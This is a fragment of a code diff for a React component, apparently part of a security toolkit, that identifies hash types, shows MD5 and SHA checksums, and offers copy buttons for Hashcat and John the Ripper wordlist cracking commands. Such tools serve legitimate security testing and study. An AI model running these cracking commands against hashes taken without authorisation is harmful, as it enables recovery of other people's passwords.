+                Paste a JWT token above or load the JWT preset example to inspect headers and claims.
+              </div>
             </div>
           )}
+        </div>
+
+        {/* Hashes & Hash Identifier Card */}
+        <div className={styles.quickCard}>
+          <div className={styles.cardHeader}>
+            <span className={styles.cardTitle}>
+              <Hash size={16} color="#34d399" /> Hashes &amp; Hash Type Identifier
+            </span>
+            <button
+              className={styles.btn}
+              onClick={handleAIHashAnalysis}
+              title="Threat intelligence and hash cracking commands (Hashcat, John)"
+            >
+              <Sparkles size={12} /> AI Hash Intel &amp; Cracker
+            </button>
+          </div>
+
+          {/* Mystery Hash Identification Display */}
+          {activeIdentified.length > 0 && (
+            <div className={styles.identifiedBox}>
+              <div className={styles.identifiedTitle}>
+                <Search size={13} color="#38bdf8" />
+                <span>Detected Hash Formats ({activeIdentified.length} matches):</span>
+              </div>
+              <div className={styles.identifiedList}>
+                {activeIdentified.map((h, i) => (
+                  <div key={i} className={styles.identifiedItem}>
+                    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '0.4rem', flexWrap: 'wrap' }}>
+                      <span style={{ fontWeight: 700, color: '#f8fafc', fontSize: '0.82rem' }}>{h.name}</span>
+                      <span className={styles.cardBadge}>{h.category}</span>
+                    </div>
+                    <div style={{ fontSize: '0.74rem', color: '#94a3b8', marginTop: '0.15rem' }}>
+                      {h.description}
+                    </div>
+                    <div style={{ display: 'flex', gap: '0.4rem', marginTop: '0.35rem', flexWrap: 'wrap' }}>
+                      <button
+                        className={styles.btnMini}
+                        onClick={() => copyToClipboard(`hashcat ${h.hashcatMode} hash.txt rockyou.txt`, `hc_${i}`)}
+                        title="Copy Hashcat command"
+                      >
+                        {copiedKey === `hc_${i}` ? <Check size={10} color="#10b981" /> : <FileCode size={10} />}
+                        <span>Hashcat: <code>{h.hashcatMode}</code></span>
+                      </button>
+                      <button
+                        className={styles.btnMini}
+                        onClick={() => copyToClipboard(`john --format=${h.johnFormat} hash.txt --wordlist=rockyou.txt`, `john_${i}`)}
+                        title="Copy John the Ripper command"
+                      >
+                        {copiedKey === `john_${i}` ? <Check size={10} color="#10b981" /> : <FileCode size={10} />}
+                        <span>John: <code>{h.johnFormat}</code></span>
+                      </button>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            </div>
+          )}
+
+          <div>
+            <div className={styles.inputLabel} style={{ marginTop: activeIdentified.length > 0 ? '0.5rem' : '0' }}>
+              Computed Checksums (for Input)
+            </div>
+            <table className={styles.hashTable}>
+              <tbody>
+                <tr>
+                  <td className={styles.hashLabel}>MD5</td>
+                  <td className={styles.hashVal}>{hashes.md5}</td>
+                  <td style={{ width: '40px', textAlign: 'right' }}>
+                    <button className={styles.btnMini} onClick={() => copyToClipboard(hashes.md5, 'md5')}>
+                      {copiedKey === 'md5' ? <Check size={10} color="#10b981" /> : <Copy size={10} />}
+                    </button>
+                  </td>
+                </tr>
+                <tr>
+                  <td className={styles.hashLabel}>SHA-1</td>
+                  <td className={styles.hashVal}>{hashes.sha1}</td>
+                  <td style={{ width: '40px', textAlign: 'right' }}>
+                    <button className={styles.btnMini} onClick={() => copyToClipboard(hashes.sha1, 'sha1')}>
+                      {copiedKey === 'sha1' ? <Check size={10} color="#10b981" /> : <Copy size={10} />}
+                    </button>
+                  </td>
+                </tr>
+                <tr>
+                  <td className={styles.hashLabel}>SHA-256</td>
+                  <td className={styles.hashVal}>{hashes.sha256}</td>
+                  <td style={{ width: '40px', textAlign: 'right' }}>
+                    <button className={styles.btnMini} onClick={() => copyToClipboard(hashes.sha256, 'sha256')}>
+                      {copiedKey === 'sha256' ? <Check size={10} color="#10b981" /> : <Copy size={10} />}
+                    </button>
+                  </td>
+                </tr>
+                <tr>
+                  <td className={styles.hashLabel}>SHA-512</td>
+                  <td className={styles.hashVal}>{hashes.sha512}</td>
+                  <td style={{ width: '40px', textAlign: 'right' }}>
+                    <button className={styles.btnMini} onClick={() => copyToClipboard(hashes.sha512, 'sha512')}>
+                      {copiedKey === 'sha512' ? <Check size={10} color="#10b981" /> : <Copy size={10} />}
+                    </button>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
         </div>
       </div>
     </div>
